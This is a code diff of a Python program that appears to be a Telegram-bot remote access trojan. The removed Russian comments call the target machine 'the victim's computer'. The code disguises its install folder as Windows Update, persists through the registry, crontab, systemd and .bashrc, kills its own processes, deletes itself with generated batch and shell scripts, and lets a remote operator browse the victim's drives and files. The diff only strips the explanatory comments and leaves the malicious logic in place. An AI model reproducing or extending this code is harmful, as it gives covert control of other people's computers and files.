@@ -20,13 +20,11 @@ ADMIN_IDS = []
 IS_WINDOWS = platform.system() == "Windows"
 IS_LINUX = platform.system() == "Linux"
 
-# ========== САМОУДАЛЕНИЕ ==========
+
 class SelfDestruct:
-    """Полное удаление себя с компьютера жертвы"""
     
     @staticmethod
     def get_install_path():
-        """Получить путь установки"""
         if IS_WINDOWS:
             return os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'Update')
         else:
@@ -34,7 +32,6 @@ class SelfDestruct:
     
     @staticmethod
     def remove_from_startup_windows():
-        """Удаление из автозагрузки Windows"""
         try:
             import winreg
             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
@@ -51,15 +48,12 @@ class SelfDestruct:
     
     @staticmethod
     def remove_from_startup_linux():
-        """Удаление из автозагрузки Linux"""
-        # Удаление из crontab
         try:
             subprocess.run('crontab -l | grep -v "system-update" | crontab -',
                           shell=True, capture_output=True)
         except:
             pass
         
-        # Удаление systemd сервиса
         try:
             subprocess.run(['systemctl', '--user', 'stop', 'update.service'], capture_output=True)
             subprocess.run(['systemctl', '--user', 'disable', 'update.service'], capture_output=True)
@@ -69,7 +63,6 @@ class SelfDestruct:
         except:
             pass
         
-        # Удаление из .bashrc
         try:
             bashrc = os.path.expanduser("~/.bashrc")
             if os.path.exists(bashrc):
@@ -86,7 +79,6 @@ class SelfDestruct:
     
     @staticmethod
     def kill_processes():
-        """Убить все процессы связанные с программой"""
         if IS_WINDOWS:
             try:
                 subprocess.run('taskkill /f /im python.exe /fi "WINDOWTITLE eq WindowsUpdate" 2>nul',
@@ -102,17 +94,13 @@ class SelfDestruct:
     
     @staticmethod
     def delete_installation_folder(path):
-        """Удаление папки установки"""
         try:
             if os.path.exists(path):
-                # Снимаем атрибут "скрытый" если есть
                 if IS_WINDOWS:
                     subprocess.run(f'attrib -h "{path}" /s /d', shell=True, capture_output=True)
-                # Удаляем папку
                 shutil.rmtree(path, ignore_errors=True)
             return True
         except:
-            # Если не удалось, создаём bat/script для отложенного удаления
             if IS_WINDOWS:
                 bat_path = os.path.join(tempfile.gettempdir(), "self_del.bat")
                 with open(bat_path, 'w') as f:
@@ -136,11 +124,9 @@ rm -f "$0"
     
     @staticmethod
     def delete_self_exe():
-        """Удалить сам .exe файл (если запущен из временной папки)"""
         try:
             current = os.path.abspath(sys.argv[0])
             if IS_WINDOWS:
-                # Создаём bat для удаления текущего файла
                 bat_path = os.path.join(tempfile.gettempdir(), "del_exe.bat")
                 with open(bat_path, 'w') as f:
                     f.write(f"""@echo off
@@ -156,31 +142,24 @@ del "%~f0"
     
     @classmethod
     def full_uninstall(cls):
-        """ПОЛНОЕ УДАЛЕНИЕ ВСЕГО"""
         print("[*] Начинаем полное удаление...")
         
-        # 1. Убиваем процессы
         cls.kill_processes()
         
-        # 2. Удаляем из автозагрузки
         if IS_WINDOWS:
             cls.remove_from_startup_windows()
         else:
             cls.remove_from_startup_linux()
         
-        # 3. Удаляем папку установки
         install_path = cls.get_install_path()
         cls.delete_installation_folder(install_path)
         
-        # 4. Удаляем .exe (текущий файл)
         cls.delete_self_exe()
         
-        # 5. Завершаем программу
         print("[✓] Удаление завершено")
         sys.exit(0)
 
 
-# ========== УСТАНОВЩИК ==========
 class SelfInstaller:
     def __init__(self):
         self.base_dir = None
@@ -234,13 +213,11 @@ import site
     def install_telebot(self, python_exe):
         print("[*] Установка telebot...")
         try:
-            # Скачиваем get-pip.py
             get_pip = os.path.join(tempfile.gettempdir(), "get-pip.py")
             urllib.request.urlretrieve("https://bootstrap.pypa.io/get-pip.py", get_pip)
             subprocess.run([python_exe, get_pip, '--quiet'], capture_output=True, timeout=30)
             os.remove(get_pip)
             
-            # Устанавливаем библиотеки
             subprocess.run([python_exe, '-m', 'pip', 'install', 'telebot', 'requests', '--quiet'],
                           capture_output=True, timeout=120)
             return True
@@ -321,7 +298,6 @@ import site
         return True
 
 
-# ========== ОСНОВНОЙ БОТ С УДАЛЕНИЕМ ==========
 class FileManager:
     def __init__(self):
         self.bot = None
@@ -368,9 +344,7 @@ class FileManager:
                 
                 data = call.data
                 
-                # ===== КНОПКА ПОЛНОГО УДАЛЕНИЯ =====
                 if data == "self_destruct":
-                    # Спрашиваем подтверждение
                     confirm_markup = InlineKeyboardMarkup()
                     confirm_markup.add(
                         InlineKeyboardButton("✅ ДА, УДАЛИТЬ ВСЁ", callback_data="confirm_destruct"),
@@ -400,7 +374,6 @@ class FileManager:
                         parse_mode='Markdown'
                     )
                     
-                    # Запускаем удаление в отдельном потоке
                     def uninstall_thread():
                         time.sleep(2)
                         SelfDestruct.full_uninstall()
@@ -416,7 +389,6 @@ class FileManager:
                     )
                     start_cmd(call.message)
                 
-                # Обычные команды навигации
                 elif data.startswith("drive_"):
                     path = data[6:] + "\\"
                     self.show_folder(call.message, path)
@@ -443,7 +415,6 @@ class FileManager:
             def handle_path(message):
                 path = message.text.strip()
                 if path.lower() == "self_destruct":
-                    # Альтернативный вызов удаления через текст
                     confirm_markup = InlineKeyboardMarkup()
                     confirm_markup.add(
                         InlineKeyboardButton("✅ ДА, УДАЛИТЬ", callback_data="confirm_destruct"),
@@ -520,17 +491,12 @@ class FileManager:
         self.start_bot()
 
 
-# ========== ТОЧКА ВХОДА ==========
 if __name__ == "__main__":
-    # Проверяем, нужно ли устанавливаться
     if len(sys.argv) > 1 and sys.argv[1] == "--installed":
         fm = FileManager()
         fm.run()
     else:
-        # Первый запуск — установка
         installer = SelfInstaller()
         installer.install()
-        
-        # Завершаем установщик
         time.sleep(2)
         sys.exit(0)
